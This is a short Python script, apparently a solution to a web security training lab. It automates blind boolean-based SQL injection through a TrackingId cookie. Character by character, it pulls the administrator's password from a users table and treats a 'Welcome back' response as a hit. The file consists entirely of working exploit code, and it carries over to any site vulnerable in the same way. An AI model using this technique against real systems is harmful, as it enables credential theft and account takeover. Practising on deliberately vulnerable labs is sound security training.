import requests
import time

URL = 'https://ac2e1f8a1efab3b4c06352a9000d00d3.web-security-academy.net'
characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'


def find_password(tracking_code, session):
    password = ""
    index = 0
    while True:
        time.sleep(0.5)
        found = False
        index = index + 1
        for character in characters:
            sql_query = f"' AND (SELECT SUBSTRING(password,{index},1) FROM users WHERE username='administrator')='{character}"
            response = requests.get(URL, cookies={'TrackingId': f"{tracking_code}{sql_query}", 'session': session})
            if "Welcome back" in str(response.text):
                found = True
                password = password + character
                continue
        if not found:
            print(password)
            break


if __name__ == '__main__':
    r = requests.get(URL)
    tracking_code = r.cookies['TrackingId']
    session = r.cookies['session']
    find_password(tracking_code, session)